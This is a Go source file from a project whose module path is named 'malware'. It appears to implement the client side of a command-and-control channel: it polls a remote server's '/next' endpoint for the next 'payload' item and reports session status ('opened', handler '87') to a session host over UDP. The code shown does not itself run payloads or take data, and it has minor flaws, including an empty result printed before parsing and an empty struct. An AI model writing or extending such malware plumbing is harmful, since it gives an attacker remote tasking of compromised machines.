package payloadsreciever

import (
	// "bytes"
	"encoding/json"
	"fmt"
	"log"
	"malware/env" // Replace with actual package path for Env
	"net"
	"net/http"
	"time"
)

type NextBody struct {
	Item string `json:"item"` 
} 

// Response struct to capture the response from GetPayload
type Response struct {
	Body   NextBody  `json:"body"`  // Parsed JSON object
	Status int         `json:"status"`
}

// Request struct for the message being sent over UDP
type Request struct {
	HandlerId string      `json:"handlerId"`
	Payload   interface{} `json:"payload"`
}

// GetPayload fetches a payload from a remote URL and returns the parsed response
func GetPayload(env env.Env) (*Response, error) {
	resp, err := http.Get(fmt.Sprintf("%s%s",env.RemoteURL,"/next"))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Parse the JSON response
	var bodyData NextBody 
	err = json.NewDecoder(resp.Body).Decode(&bodyData)
	if err != nil {
		return nil, err
	}

	// Return the response object
	return &Response{
		Body:   bodyData,
		Status: resp.StatusCode,
	}, nil
}

type UdpServerResponse[T comparable] struct {
	Status  string `json:"status"`
	Payload T      `json:"payload"`
}

type SessionStatusResponse = UdpServerResponse[string]

func SendUDPReq(message Request, port int, host string) (
	SessionStatusResponse, error) {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return *new(SessionStatusResponse), fmt.Errorf("failed to dial UDP address: %w", err)
	}
	defer conn.Close()

	messageBytes, err := json.Marshal(message)
	if err != nil {
		return *new(SessionStatusResponse), fmt.Errorf("failed to serialize message: %w", err)
	}

	_, err = conn.Write(messageBytes)
	if err != nil {
		return *new(SessionStatusResponse), fmt.Errorf("failed to send message: %w", err)
	}
	fmt.Printf("Message sent: %s\n", string(messageBytes))

	readDeadline := time.Now().Add(5 * time.Second) 
	conn.SetReadDeadline(readDeadline)

	buffer := make([]byte, 1024) 
	n, err := conn.Read(buffer)
	if err != nil {
		return *new(SessionStatusResponse), fmt.Errorf("failed to read response: %w", err)
	}

	// Returning the response as a generic type T (casting the buffer to T)
	var result SessionStatusResponse
	fmt.Println(result)
	err = json.Unmarshal(buffer[:n], &result)
	if err != nil {
		return *new(SessionStatusResponse), fmt.Errorf("failed to unmarshal response: %w", err)
	}

	return result, nil
}

type getSessionStatusRequest struct {
	HandlerId string `json:"handlerId"`
	Payload   string `json:"payload"`
}

func GetSessionStatus(env env.Env) SessionStatusResponse {
	payloadBytes, err := json.Marshal(getSessionStatusRequest{
		HandlerId: "87",
        Payload:   "opened",  // Replace with actual payload value for your application
	})
	if err != nil {
		log.Fatalf("Error marshalling JSON: %v", err)
	}

	// Send the UDP request
	res, err := SendUDPReq(Request{
		HandlerId: "87",
		Payload: payloadBytes,
	}, env.Session.Port, env.Session.Host)
	if err != nil {
		log.Fatalf("Error sending UDP request: %v", err)
	}
	return res
}

type PayloadResponse struct {

}
